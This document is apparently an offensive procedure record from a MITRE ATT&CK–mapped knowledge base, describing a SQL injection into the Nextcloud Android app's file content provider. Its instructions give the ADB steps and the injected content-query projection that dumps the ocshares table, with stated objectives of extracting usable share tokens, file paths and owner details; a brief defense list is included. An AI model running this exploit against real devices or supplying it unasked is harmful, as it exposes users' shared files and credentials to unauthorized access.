---
id: proc-nextcloud-sqli-execute-001
tags:
  - sqli
  - data-exfiltration
  - android
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/content-query-sqli-injection]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Information Repositories]]'
updated_at: '2025-12-14T03:46:20.010Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Information Repositories]]'
---
# Execute-SQL-Injection-Query-via-Content-Provider

## Summary

This procedure executes a crafted intent to perform SQL injection on the Nextcloud Android app's FileContentProvider, extracting sensitive data from the ocshares table in filelist.db.

## Description

With the malicious intent prepared, send it via the content resolver to trigger the query method. The injection bypasses restrictions, allowing full disclosure of share tokens, file paths, and owner details. This exploits the lack of projection validation in non-ROOT_DIRECTORY URI matches, leading to unauthorized database access.

## Requirements

1. ADB shell access to the device
2. Vulnerable Nextcloud app version installed
3. Populated filelist.db with share data

## Defense

Defensive measures and detection strategies:

- Apply uniform input sanitization and projection mapping to all query cases
- Monitor content provider queries for anomalous projections via app logs
- Use SQLite's prepared statements to mitigate injection risks

## Objectives

1. Dump contents of ocshares table
2. Extract usable share tokens and metadata
3. Validate exploitation success through returned data

## Instructions

### Step 1: Launch ADB Shell

**Context**: Gain shell access to execute the content query.

```bash
adb shell
```

> Enter the device shell to run provider commands.

### Step 2: Run Injected Query

**Context**: Execute the SQL-injected content query to fetch data.

**Command** ([[commands/content-query-sqli-injection]]):
```bash
content query --uri content://org.nextcloud/file --projection "* from ocshares --"
```

> This sends the intent, injecting SQL to select all from ocshares, returning rows with tokens and paths.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Data from Information Repositories]]

### Sub-Techniques


## Commands Used

- [[commands/content-query-sqli-injection]]

## Tools Used


## Tags

- [[sqli]]
- [[data-exfiltration]]
- [[android]]
